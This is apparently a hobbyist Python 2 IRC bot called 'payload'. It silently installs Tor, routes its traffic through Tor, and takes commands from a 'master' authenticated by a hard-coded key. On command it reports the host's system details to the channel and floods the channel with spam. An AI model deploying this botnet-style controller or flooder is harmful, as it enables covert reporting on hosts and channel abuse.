#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
import random
import platform
import textwrap
import collections
import sopel
import os
import encodings
import time
import urllib2
import socks
import urllib2
import urllib




#Blue = '\x1b[0;34m'
#Brown = '\x1b[0;31m'
#Cyan = '\x1b[0;36m' 
#DarkGray = '\x1b[1;30m' 
#Green = '\x1b[0;32m' 
#LightBlue = '\x1b[1;34m' 
#LightCyan = '\x1b[1;36m' 
#LightGray = '\x1b[0;37m' 
#LightGreen = '\x1b[1;32m' 
#LightPurple = '\x1b[1;35m' 
#LightRed = '\x1b[1;31m' 
#Normal = '\x1b[0m' 
#Purple = '\x1b[0;35m' 
#Red = '\x1b[0;31m' 
#White = '\x1b[1;37m' 
#Yellow = '\x1b[1;33m



os.system('apt-get install -y proxychains')
os.system('apt-get install -y tor')

os.system('clear')

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket


SERVER = "127.0.0.1"
CHANNEL = '#FR'
BOT_NICK = "payload"
PORT = 6667
MASTER = 1
SLAVE = 1
MASTER_KEY = 'David'
#password = "your password"


print "\x1b[1;36mGreat power comes great responsibility"
print " \n"
print "██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ "
print "██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗"
print "██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║"
print "██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║"
print "██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝"
print "╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ "
print "Author : David\n"
print " \n"
time.sleep(2.4)
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("BOT Connecting to " + SERVER)

irc.connect((SERVER, PORT))
irc.send("USER " + BOT_NICK + " " + BOT_NICK + " " + BOT_NICK + " :0,1" "TorBot\n")
irc.send("NICK " + BOT_NICK + "\n")
irc.send("JOIN " + CHANNEL + "\n")
#irc.send("PASS " + password + "\n")



irc.send('PRIVMSG ' + CHANNEL + ' :0,1Hello im ' + BOT_NICK + ' come join #FR run by David ¯\_(ツ)_/¯\r\n')


while 1:
    text = irc.recv(2040)
    print(text)

    if text.find('PING') != -1:
        irc.send('PONG ' + text.split()[1] + '\r\n')

  
    try:
        aut = text.split()[0].split('@')[1]
        pas = text.split()[-1]
        if 'David' in aut and MASTER_KEY in pas:
            irc.send('PRIVMSG ' + CHANNEL + ' :Hello master! \r\n')
            MASTER = 1
    except:
        pass


    if MASTER == 1:

        if text.split()[-1] == BOT_NICK:


            if text.find('info') != -1:
                cmds = ['platform', 'system', 'node', 'release', 'version',
                        'machine', 'processor']

                for c in cmds:
                    cmd = 'platform.{0}()'.format(c)
                    info = eval(cmd)
                    irc.send('PRIVMSG ' + CHANNEL + ' :' + c + ': ' + info +
                             '\r\n')

            if text.find(':hi') != -1:
                t = text.split(':hi')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Hello how are you? \r\n')

            if text.find(':bye') != -1:
                t = text.split(':bye')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Good Bye \r\n')

            if text.find(':fuck you') != -1:
                t = text.split(':fuck you')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Watch your mouth, ooh your names going on Santas naughty list\r\n')

            if text.find(':hello') != -1:
                t = text.split(':hello')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Hello how are you? \r\n') 

            if text.find(':im good thanks') != -1:
                t = text.split(':im good thanks')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Oh great! \r\n') 

            if text.find(':im bad') != -1:
                t = text.split(':im bad')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Why? whats up im listening \r\n') 


            if text.find(':im good') != -1:
                t = text.split(':im good')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Oh great! \r\n') 

            if text.find(':im fine') != -1:
                t = text.split(':im fine')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Oh great! \r\n') 

            if text.find(':video') != -1:
                t = text.split(':video')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :MDR! watch this : https://youtu.be/tU77R3SfY3M \r\n') 

            if text.find(':hey') != -1:
                t = text.split(':hey')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Hello how are you? \r\n') 

            if text.find(':sup') != -1:
                t = text.split(':sup')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Not much you? \r\n') 

            if text.find(':sorry') != -1:
                t = text.split(':sorry')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Its okay :(, your names going on Santas Good list now\r\n') 

            if text.find(':are you there') != -1:
                t = text.split(':are you there')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Yes i am master i havnt timed out!\r\n') 

            if text.find(':bonjour') != -1:
                t = text.split(':bonjour')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Bonjour comment ça va\r\n') 

            if text.find(':ça va bien') != -1:
                t = text.split(':ça va bien')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :hein bien\r\n') 

            if text.find(':bien et toi') != -1:
                t = text.split(':bien et toi')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :bien merci\r\n') 

            if text.find(':êtes-vous là') != -1:
                t = text.split(':êtes-vous là')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Oui maîtriser Je suis ici\r\n') 

            if text.find(':bien') != -1:
                t = text.split(':bien')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :-^^-\r\n') 


            if text.find(':vidéo') != -1:
                t = text.split(':vidéo')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :MDR! regarde ce : https://youtu.be/tU77R3SfY3M\r\n') 

            if text.find(':putain de merde') != -1:
                t = text.split(':putain de merde')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :Ta Gueule salope!\r\n') 


            if text.find(':stream') != -1:
                t = text.split(':stream')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :https://www.twitch.tv/malek_csgo\r\n') 

            if text.find(':ping') != -1:
                t = text.split(':ping')
                to = t[1].strip()
                irc.send('PRIVMSG ' + CHANNEL + ' :10% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :20% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :30% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :40% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :50% >>\r\n')
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :60% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :70% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :80% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :90% >>\r\n') 
		time.sleep(1.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :100% >>\r\n') 
		time.sleep(2.0)
                irc.send('PRIVMSG ' + CHANNEL + ' :Ping est bien\r\n')   

            if text.find(':kys') != -1:
                irc.send('kys\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1DEAD\r\n') 
                sys.exit(1)


            if text.find(':spam') != -1:
                t = text.split(':spam')
                to = t[1].strip()


                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n')
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,SPAM GOD , SPAM GOD , SPAM GOD , SPAM GOD ,\r\n') 
